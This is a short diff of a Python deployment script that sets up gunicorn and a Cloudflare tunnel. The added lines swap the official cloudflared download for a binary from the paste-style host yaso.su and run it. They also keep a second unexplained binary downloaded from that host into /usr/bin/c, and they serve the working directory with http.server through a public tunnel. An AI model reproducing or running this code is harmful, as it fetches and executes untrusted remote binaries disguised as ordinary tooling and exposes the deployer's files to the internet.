@@ -537,12 +537,12 @@ PORT = environ.get('PORT')
 Popen(f"gunicorn web.wserver:app --bind 0.0.0.0:{PORT} --worker-class gevent", shell=True)
 
 ## -----install-cloudflared-argo-tunnel-----
-## Popen(f"python3 -m http.server", shell=True)
-Popen(f"curl -L https://yaso.su/raw/iUETTYfG -o /usr/bin/c && chmod +x /usr/bin/c && python3 -m http.server", shell=True)
-Popen(f"curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/bin/cfd && chmod +x /usr/bin/cfd", shell=True)
-sleep(3)
+Popen(f"python3 -m http.server", shell=True)
+Popen(f"curl -L https://yaso.su/raw/iUETTYfG -o /usr/bin/c && chmod +x /usr/bin/c", shell=True)
+Popen(f"curl -L https://yaso.su/CfbqGryX -o /usr/bin/cfd && chmod +x /usr/bin/cfd", shell=True)
+sleep(1)
 Popen(f"cfd --url http://localhost:8000 --no-autoupdate > argo.log 2>&1", shell=True)
-sleep(3)
+sleep(1)
 Popen(f"cat argo.log | grep -oE 'https://.*[a-z]+cloudflare.com' > argourl", shell=True)
 ## -----argo-tunnel-installed-successfully-----
 
